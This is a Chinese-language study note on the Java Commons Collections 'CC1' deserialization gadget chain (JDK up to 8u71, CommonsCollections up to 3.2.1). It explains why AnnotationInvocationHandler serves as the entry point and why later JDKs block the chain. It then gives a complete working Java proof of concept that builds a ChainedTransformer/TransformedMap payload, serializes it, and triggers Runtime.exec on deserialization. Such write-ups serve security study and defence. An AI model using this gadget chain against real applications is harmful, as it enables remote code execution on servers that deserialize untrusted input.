CC1链：java<=JDK8u71、CommonsCollections<=3.2.1

Java原生的标准反序列化要利用一定要满足两个条件，入口类实现了序列化接口并且重写了readObject函数。实现序列化接口的类才能被Java序列化和反序列化，重写readObject方法才有可能执行到危险方法。否则无法调起和执行其他代码，更无从谈起利用。

要找到这么一个类，他可以反序列化并且重新了readObject方法，readObject方法中可以利用，则我们就反序列化这个类。
CommonsCollections库中就有这么一个类AnnotationInvocationHandler。
并且通过中间的Transformer类，可以任意执行代码，成功通过反射Runtime.class执行命令。




## **执行流程**
![](.topwrite/assets/image_1727054486304.png)
![](.topwrite/assets/image_1727054525365.png)


## **修复**
因为在JDK1.8的8u71之后的版本反序列化不再通过 defaultReadobject 方式，而是通过readFields来获取几个特定的属性，defaultReadobject 可以恢复对象本身的类属性，比如 this.memberValues就能恢复成我们原本设置的恶意类，但通过 readFields 方式，this.memberValues就为null，所以后续执行get()就必然没触发，这也就是高版本不能使用的原因。

## **验证**
```
public class POC1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        //Runtime r = Runtime.getRuntime();
  /*      Class c = Runtime.class;
        Method getRuntimeMethod = c.getMethod("getRuntime", null);
        Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);
        Method execMethod = c.getMethod("exec", String.class);
        execMethod.invoke(r,"calc");*/
   /*     Method getRuntimeMethod = (Method)new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}).transform(Runtime.class);

        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, null}).transform(getRuntimeMethod);

        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
*/
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);


        //InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","bbb");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
/*        for(Map.Entry entry:transformedMap.entrySet()){
 //          entry.setValue(Runtime.class);
        }*/
        //AnnotationInvocationHandler
        /*  Reader*/
            Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationdhdlConstructor.setAccessible(true);
        Object o = annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap);

        serialize(o);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException, IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

